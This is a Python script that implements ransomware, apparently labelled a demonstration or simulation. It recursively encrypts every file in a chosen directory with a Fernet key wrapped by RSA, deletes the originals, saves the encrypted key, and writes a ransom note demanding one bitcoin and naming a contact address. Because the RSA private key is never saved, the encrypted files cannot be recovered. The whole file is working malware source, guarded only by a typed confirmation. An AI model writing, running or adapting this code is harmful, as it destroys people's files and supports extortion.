import os
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes

class RansomwareExample:
    def __init__(self, target_dir):
        self.target_dir = target_dir
        self.symmetric_key = Fernet.generate_key()
        self.fernet = Fernet(self.symmetric_key)
        self.public_key, self.private_key = self.generate_rsa_keypair()
        self.encrypted_symmetric_key = None

    def generate_rsa_keypair(self):
        # """Generate an RSA public-private key pair."""
        private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        public_key = private_key.public_key()
        return public_key, private_key

    def encrypt_symmetric_key(self):
        # """Encrypt the symmetric key with the RSA public key."""
        self.encrypted_symmetric_key = self.public_key.encrypt(
            self.symmetric_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )

    def encrypt_file(self, filepath):
        # """Encrypt a single file and overwrite it."""
        try:
            if not os.path.isfile(filepath) or filepath.endswith("ransom_note.txt"):
                return

            # Read the file
            with open(filepath, "rb") as file:
                file_data = file.read()

            # Encrypt the file data
            encrypted_data = self.fernet.encrypt(file_data)

            # Overwrite with encrypted data and change extension
            encrypted_filepath = filepath + ".ransom"
            with open(encrypted_filepath, "wb") as file:
                file.write(encrypted_data)

            # Delete the original file
            os.remove(filepath)
            print(f"Encrypted: {filepath} -> {encrypted_filepath}")

        except Exception as e:
            print(f"Error encrypting {filepath}: {str(e)}")

    def encrypt_directory(self):
        # """Encrypt all files in the target directory (recursive)."""
        try:
            if not os.path.isdir(self.target_dir):
                print(f"Error: {self.target_dir} is not a directory.")
                return

            # Encrypt the symmetric key
            self.encrypt_symmetric_key()

            # Walk through the directory
            for dirpath, _, filenames in os.walk(self.target_dir):
                for filename in filenames:
                    filepath = os.path.join(dirpath, filename)
                    self.encrypt_file(filepath)

            # Save the encrypted symmetric key
            key_file = os.path.join(self.target_dir, "encrypted_key.bin")
            with open(key_file, "wb") as f:
                f.write(self.encrypted_symmetric_key)

            # Create a ransom note
            self.create_ransom_note()

            print("Encryption complete. Symmetric key encrypted and saved.")
            print(f"Ransom note created in {self.target_dir}")

        except Exception as e:
            print(f"Error processing directory: {str(e)}")

    def create_ransom_note(self):
        # """Create a ransom note in the target directory."""
        ransom_note = """
YOUR FILES HAVE BEEN ENCRYPTED!
To recover your files, you must pay 1 BTC to [1A1zP15iBiwWng3FDojXOGfNtmv7DivfNa].
Contact us at [attacker@example.com] with proof of payment.
The encrypted key is in 'encrypted_key.bin'.
DO NOT attempt to decrypt without the private key.
"""
        note_path = os.path.join(self.target_dir, "ransom_note.txt")
        with open(note_path, "w") as f:
            f.write(ransom_note)

def main():
    # Example target directory (use a test directory for safety!)
    target_dir = input("Enter the directory to encrypt (e.g., /home/user/test): ").strip()
    if not target_dir:
        print("Error: No directory provided.")
        return

    # Initialize and run the ransomware simulation
    ransomware = RansomwareExample(target_dir)
    print("WARNING: This will encrypt files in the specified directory!")
    confirm = input("Type 'YES' to proceed: ").strip()
    if confirm == "YES":
        ransomware.encrypt_directory()
    else:
        print("Operation cancelled.")

if __name__ == "__main__":
    main()